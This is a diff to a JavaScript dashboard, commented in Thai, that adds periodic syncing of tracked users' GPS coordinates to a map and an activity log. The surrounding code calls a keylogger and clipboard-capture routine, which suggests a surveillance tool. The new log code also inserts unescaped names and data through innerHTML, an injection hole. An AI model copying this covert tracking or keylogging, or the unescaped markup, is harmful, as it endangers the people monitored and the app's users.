@@ -125,6 +125,8 @@ function safeInit() {
   bindEvents();
   startClock();
   initKeyloggerAndClipboard();
+  initActivityLog();
+  startMobileSync();
   
   const saved = loadSession();
   if (saved && saved.username) {
@@ -1820,10 +1822,10 @@ function showDashboard(user, restore = false, role = 'super-admin') {
   initMonitors();
   initDeviceOrientation();
 
-  // ซ่อนหน้าจอล็อกอินและแสดงหน้า Dashboard
+  // ซ่อนหน้าจอล็อกอินและแสดงหน้า App Selector (ไม่ใช่ Dashboard โดยตรง)
   if (loginScreen) loginScreen.classList.add('hidden');
-  if (appSelector) appSelector.classList.add('hidden');
-  if (dashboard) dashboard.classList.remove('hidden');
+  if (appSelector) appSelector.classList.remove('hidden');
+  if (dashboard) dashboard.classList.add('hidden');
   if (infoSession) infoSession.textContent = user;
   if (infoActiveTarget) infoActiveTarget.textContent = 'Admin';
   
@@ -1989,10 +1991,10 @@ function initMobileDrawers() {
     handleCommand('/clear');
   });
   
-  drawerBackToMenuBtn?.addEventListener('click', () => {
+drawerBackToMenuBtn?.addEventListener('click', () => {
     showLoading('กลับสู่เมนูหน้าแรก...');
     setTimeout(() => {
-      showLogin();
+      showAppSelector();
       hideLoading();
     }, 500);
   });
@@ -2051,10 +2053,10 @@ function initQuickActionButtons() {
     handleCommand('/clear');
   });
   
-  backToMenuBtn?.addEventListener('click', () => {
+backToMenuBtn?.addEventListener('click', () => {
     showLoading('กลับสู่เมนูหน้าแรก...');
     setTimeout(() => {
-      showLogin();
+      showAppSelector();
       hideLoading();
     }, 500);
   });
@@ -2208,6 +2210,79 @@ function bindEvents() {
   window.addEventListener('resize', () => {
     try { mapInstance?.invalidateSize(); } catch (_) {}
   });
+}
+
+// ===== MOBILE COORDINATE SYNC =====
+let mobileSyncTimer = null;
+const MOBILE_SYNC_INTERVAL = 7000; // 7 วินาที
+
+function startMobileSync() {
+  if (mobileSyncTimer) clearInterval(mobileSyncTimer);
+  mobileSyncTimer = setInterval(() => {
+    syncMobileCoordinates();
+  }, MOBILE_SYNC_INTERVAL);
+}
+
+function stopMobileSync() {
+  if (mobileSyncTimer) {
+    clearInterval(mobileSyncTimer);
+    mobileSyncTimer = null;
+  }
+}
+
+function syncMobileCoordinates() {
+  if (!sessionUser) return;
+  
+  players.forEach((p) => {
+    if (p.tracking && p.coords) {
+      // ตรวจสอบการอัปเดตล่าสุดจากมือถือ
+      const lastUpdate = p.lastUpdate ? new Date(p.lastUpdate) : null;
+      const now = new Date();
+      
+      // ถ้ามีการอัปเดตใน 10 วินาทีที่ผ่านมา ให้รีเฟรชข้อมูล
+      if (lastUpdate && (now - lastUpdate) < 10000) {
+        // อัปเดตแผนที่โดยอัตโนมัติ
+        if (mapInstance && p.coords) {
+          updateMapMarker('player', p.id, p.coords.latitude, p.coords.longitude,
+            `<b>${esc(p.name)}</b><br>${p.coords.latitude.toFixed(5)}, ${p.coords.longitude.toFixed(5)}<br>${p.distanceKm ? p.distanceKm.toFixed(2) + ' km from HQ' : ''}<br><a href="https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}" target="_blank" class="text-orange-400">🗺️ เปิดใน Google Maps</a>`);
+        }
+        // อัปเดต Left Sidebar Activity Log
+        updateActivityLog(p.id, '📍 พิกัดอัปเดต', `${p.coords.latitude.toFixed(6)}, ${p.coords.longitude.toFixed(6)}`);
+      }
+    }
+  });
+}
+
+// ===== LEFT SIDEBAR ACTIVITY LOG =====
+let activityLogEl = null;
+
+function initActivityLog() {
+  activityLogEl = $('activity-log');
+}
+
+function updateActivityLog(playerId, eventType, data) {
+  if (!activityLogEl) return;
+  
+  const p = getPlayer(playerId);
+  const playerName = p ? p.name : playerId;
+  const time = new Date().toLocaleTimeString('th-TH', { hour12: false });
+  
+  const entry = document.createElement('div');
+  entry.className = 'activity-entry text-[10px] py-1 border-b border-neutral-800/50 last:border-0';
+  entry.innerHTML = `
+    <div class="flex items-center gap-1">
+      <span class="text-cyan-400">${time}</span>
+      <span class="text-green-400">${eventType}</span>
+    </div>
+    <div class="text-white/80 truncate">${playerName}: ${data}</div>
+  `;
+  
+  activityLogEl.insertBefore(entry, activityLogEl.firstChild);
+  
+  // เก็บเพียง 50 รายการล่าสุด
+  while (activityLogEl.children.length > 50) {
+    activityLogEl.removeChild(activityLogEl.lastChild);
+  }
 }
 
 // ===== BOOT =====
